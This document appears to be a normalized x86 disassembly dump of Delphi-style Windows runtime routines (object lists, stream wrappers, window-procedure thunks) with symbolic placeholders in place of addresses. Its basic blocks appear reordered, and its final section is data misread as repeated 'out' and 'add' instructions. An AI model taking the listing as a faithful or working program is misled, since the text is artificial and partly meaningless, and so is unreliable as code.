mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4216e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_421494
push ebx
push sub_4214bc
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4214a8
push ebx
push sub_4214c8
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_4217e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_408020
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_421878
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
sub_421878
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4189b0
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_408020
test al al
jne r-xdata
sub_4218c8
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4044b8
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_4081d8
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
call sub_403a64
xor edx edx
mov eax ebx
call sub_421a48
mov edx esi
mov eax ebx
call sub_421954
mov dl 0x1
mov eax ebx
call sub_421a48
sub_421968
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4189b0
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41893c
sub_4219a4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_418a0c
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4188a0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_418a2c
sub_4219f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_421994
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_421968
mov cl 0x1
mov edx ebx
call sub_4219f8
inc edi
dec ebp
jne r-xdata
sub_421a48
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404348
mov edx esp
mov eax esi
call sub_4035ac
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_421a90
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_421ab8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_421b00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403364
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421b60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_421b84
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_421bcc
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
mov edx esi
call sub_421dfc
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_421c34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_421dfc
mov edx ebx
mov eax esi
call sub_421df0
sub_421c78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421370
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_421cbc
push ebx
push esi
push edi
call sub_403664
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4213bc
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_421670
jmp r-xdata
mov eax esi
call sub_418a98
mov edx eax
mov eax edi
call sub_421dfc
lea eax [ edi + 0x50 ]
call sub_40d564
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
sub_421d1c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_42168c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_421d48
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_421d64
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_421d80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4189b0
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_421dfc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4188a0
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4189b0
cmp ebp eax
jne r-xdata
sub_421e3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_421670
mov edx ebx
call sub_421440
sub_421e68
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403280
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_421eb0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4032b0
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_421ee8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421f37
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421f50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421f9f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421fb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_422022
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_42203c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_422085
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41aeec
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4220a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_4059b8
xor eax eax
push ebp
push sub_42228d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_422266
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026ec
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_422255
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40270c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403b10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422294
lea eax [ ebp + 0xc ]
call sub_405944
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403b10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_4222d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_422333
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_422364
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418d74
mov edi eax
xor eax eax
push ebp
push sub_4223b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223c0
mov eax [ rw-data ]
call sub_418dd8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4189b0
call sub_4032b0
inc esi
dec ebx
jne r-xdata
sub_4223d8
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_422400
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028e8
mov edx sub_4223d8
lea eax [ esi + 0x5 ]
call sub_4223f8
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4223f8
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_4224bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406d20
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422400
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_422570
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_422498
sub_422598
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42263c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422643
retn
mov eax [ rw-data ]
call sub_417f98
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_422364
xor edx edx
xor eax eax
call sub_41be50
mov eax rw-data
call sub_40d564
call sub_406074
lea eax [ eax + 0xc ]
call sub_40d564
mov eax rw-data
call sub_40d564
mov eax rw-data
call sub_405944
mov eax sub_4223d0
call sub_4057e0
mov eax rw-data
call sub_40d564
call sub_420bd8
mov eax rw-data
call sub_40d564
mov eax rw-data
call sub_405944
sub_422648
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4226d1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4226d8
retn
call sub_420ba4
mov eax sub_4223d0
call sub_4057d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d2a4
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_40595c
mov dl 0x1
mov eax [ r-xdata ]
call sub_417894
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418c1c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_4226dc
out 0x48 al
add [ edi + 0x640000ff ] cl
out 0x48 al
add [ eax - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] dh
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] dh
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] bh
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] bh
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] ah
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] ah
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] ch
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] ch
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] dl
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] dl
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] bl
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] bl
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] al
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] al
add [ eax ] al
out 0x48 al
add [ eax - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ ecx - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ edx - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ ebx - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ edi + edi * 8 ] cl
add [ esi + 0x48 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ esi - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ edi - 0x1 ] cl
add [ eax ] al
out 0x48 al
add [ eax ] dh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + 0x48 ] ah
add [ ebx ] dh
inc [ eax ]
